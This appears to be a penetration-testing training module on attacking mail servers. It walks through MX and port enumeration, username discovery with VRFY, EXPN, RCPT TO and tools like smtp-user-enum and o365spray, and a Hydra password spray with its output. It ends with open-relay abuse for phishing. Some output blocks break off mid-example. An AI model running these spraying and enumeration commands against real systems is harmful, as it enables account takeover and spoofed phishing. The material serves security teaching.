## Attacking Email Services

***

A `mail server` (sometimes also referred to as an email server) is a server that handles and delivers email over a network, usually over the Internet. A mail server can receive emails from a client device and send them to other mail servers. A mail server can also deliver emails to a client device. A client is usually the device where we read our emails (computers, smartphones, etc.).

When we press the `Send` button in our email application (email client), the program establishes a connection to an `SMTP` server on the network or Internet. The name `SMTP` stands for Simple Mail Transfer Protocol, and it is a protocol for delivering emails from clients to servers and from servers to other servers.

When we download emails to our email application, it will connect to a `POP3` or `IMAP4` server on the Internet, which allows the user to save messages in a server mailbox and download them periodically.

By default, `POP3` clients remove downloaded messages from the email server. This behavior makes it difficult to access email on multiple devices since downloaded messages are stored on the local computer. However, we can typically configure a `POP3` client to keep copies of downloaded messages on the server.

On the other hand, by default, `IMAP4` clients do not remove downloaded messages from the email server. This behavior makes it easy to access email messages from multiple devices. Let's see how we can target mail servers.

### Enumeration

Email servers are complex and usually require us to enumerate multiple servers, ports, and services. Furthermore, today most companies have their email services in the cloud with services such as [Microsoft 365](https://www.microsoft.com/en-ww/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook) or [G-Suite](https://workspace.google.com/solutions/new-business/). Therefore, our approach to attacking the email service depends on the service in use.

We can use the `Mail eXchanger` (`MX`) DNS record to identify a mail server. The MX record specifies the mail server responsible for accepting email messages on behalf of a domain name. It is possible to configure several MX records, typically pointing to an array of mail servers for load balancing and redundancy.

We can use tools such as `host` or `dig` and online websites such as [MXToolbox](https://mxtoolbox.com/) to query information about the MX records:

**Host - MX Records**

Attacking Email Services

```shell-session
AIceBear@htb[/htb]$ host -t MX hackthebox.eu

hackthebox.eu mail is handled by 1 aspmx.l.google.com.
```

Attacking Email Services

```shell-session
AIceBear@htb[/htb]$ host -t MX microsoft.com

microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
```

**DIG - MX Records**

Attacking Email Services

```shell-session
AIceBear@htb[/htb]$ dig mx plaintext.do | grep "MX" | grep -v ";"

plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
plaintext.do.           7076    IN      MX      10 mx.zoho.com.
plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
```

Attacking Email Services

```shell-session
AIceBear@htb[/htb]$ dig mx inlanefreight.com | grep "MX" | grep -v ";"

inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.
```

**Host - A Records**

Attacking Email Services

```shell-session
AIceBear@htb[/htb]$ host -t A mail1.inlanefreight.htb.

mail1.inlanefreight.htb has address 10.129.14.128
```

These `MX` records indicate that the first three mail services are using a cloud services G-Suite (aspmx.l.google.com), Microsoft 365 (microsoft-com.mail.protection.outlook.com), and Zoho (mx.zoho.com), and the last one may be a custom mail server hosted by the company.

This information is essential because the enumeration methods may differ from one service to another. For example, most cloud service providers use their mail server implementation and adopt modern authentication, which opens new and unique attack vectors for each service provider. On the other hand, if the company configures the service, we could uncover bad practices and misconfigurations that allow common attacks on mail server protocols.

If we are targetting a custom mail server implementation such as `inlanefreight.htb`, we can enumerate the following ports:

| **Port**  | **Service**                                                                 |
| --------- | --------------------------------------------------------------------------- |
| `TCP/25`  | SMTP Unencrypted                                                            |
| `TCP/143` | IMAP4 Unencrypted                                                           |
| `TCP/110` | POP3 Unencrypted                                                            |
| `TCP/465` | SMTP Encrypted                                                              |
| `TCP/587` | SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic\_TLS) |
| `TCP/993` | IMAP4 Encrypted                                                             |
| `TCP/995` | POP3 Encrypted                                                              |

We can use `Nmap`'s default script `-sC` option to enumerate those ports on the target system:

Attacking Email Services

```shell-session
AIceBear@htb[/htb]$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00025s latency).

MAC Address: 00:00:00:00:00:00 (VMware)
```

***

### Misconfigurations

Email services use authentication to allow users to send emails and receive emails. A misconfiguration can happen when the SMTP service allows anonymous authentication or support protocols that can be used to enumerate valid usernames.

**Authentication**

The SMTP server has different commands that can be used to enumerate valid usernames `VRFY`, `EXPN`, and `RCPT TO`. If we successfully enumerate valid usernames, we can attempt to password spray, brute-forcing, or guess a valid password. So let's explore how those commands work.

`VRFY` this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.

**VRFY Command**

Attacking Email Services

```shell-session
AIceBear@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

`EXPN` is similar to `VRFY`, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the `VRFY` command since sites often have an alias such as "all."

**EXPN Command**

Attacking Email Services

```shell-session
AIceBear@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


EXPN john

250 2.1.0 john@inlanefreight.htb


EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

`RCPT TO` identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.

**RCPT TO Command**

Attacking Email Services

```shell-session
AIceBear@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
```

We can also use the `POP3` protocol to enumerate users depending on the service implementation. For example, we can use the command `USER` followed by the username, and if the server responds `OK`. This means that the user exists on the server.

**USER Command**

Attacking Email Services

```shell-session
AIceBear@htb[/htb]$ telnet 10.10.110.20 110

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
+OK POP3 Server ready

USER julio

-ERR


USER john

+OK
```

To automate our enumeration process, we can use a tool named [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum). We can specify the enumeration mode with the argument `-M` followed by `VRFY`, `EXPN`, or `RCPT`, and the argument `-U` with a file containing the list of users we want to enumerate. Depending on the server implementation and enumeration mode, we need to add the domain for the email address with the argument `-D`. Finally, we specify the target with the argument `-t`.

Attacking Email Services

```shell-session
AIceBear@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

### Cloud Enumeration

As discussed, cloud service providers use their own implementation for email services. Those services commonly have custom features that we can abuse for operation, such as username enumeration. Let's use Office 365 as an example and explore how we can enumerate usernames in this cloud platform.

[O365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by [ZDH](https://twitter.com/0xzdh). This tool reimplements a collection of enumeration and spray techniques researched and identified by those mentioned in [Acknowledgments](https://github.com/0xZDH/o365spray#Acknowledgments). Let's first validate if our target domain is using Office 365.

**O365 Spray**

Attacking Email Services

```shell-session
AIceBear@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > validate       :  True
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:46:40

[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
```

Now, we can attempt to identify usernames.

Attacking Email Services

```shell-session
AIceBear@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz

### Password Attacks

We can use `Hydra` to perform a password spray or brute force against email services such as `SMTP`, `POP3`, or `IMAP4`. First, we need to get a username list and a password list and specify which service we want to attack. Let us see an example for `POP3`.

**Hydra - Password Attack**

Attacking Email Services

```shell-session
AIceBear@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task
[DATA] attacking pop3://10.10.110.20:110/
[110][pop3] host: 10.129.42.197   login: john   password: Company01!
1 of 1 target successfully completed, 1 valid password found
```

If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like `Hydra`, but these tools are usually blocked. We can instead try to use custom tools such as [o365spray](https://github.com/0xZDH/o365spray) or [MailSniper](https://github.com/dafthack/MailSniper) for Microsoft Office 365 or [CredKing](https://github.com/ustayready/CredKing) for Gmail or Okta. Keep in mind that these tools need to be up-to-date because if the service provider changes something (which happens often), the tools may not work anymore. This is a perfect example of why we must understand what our tools are doing and have the know-how to modify them if they do not work properly for some reason.

### Protocol Specifics Attacks

An open relay is a Simple Transfer Mail Protocol (`SMTP`) server, which is improperly configured and allows an unauthenticated email relay. Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.

**Open Relay**

From an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email. For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email address to send notifications to their employees. We can send a similar email using the same address and add our phishing link with this information. With the `nmap smtp-open-relay` script, we can identify if an SMTP port allows an open relay.

Attacking Email Services

```shell-session
AIceBear@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT

Host is up (0.28s latency).

PORT   STATE SERVICE
25/tcp open  smtp

```

Next, we can use any mail client to connect to the mail server and send our email.
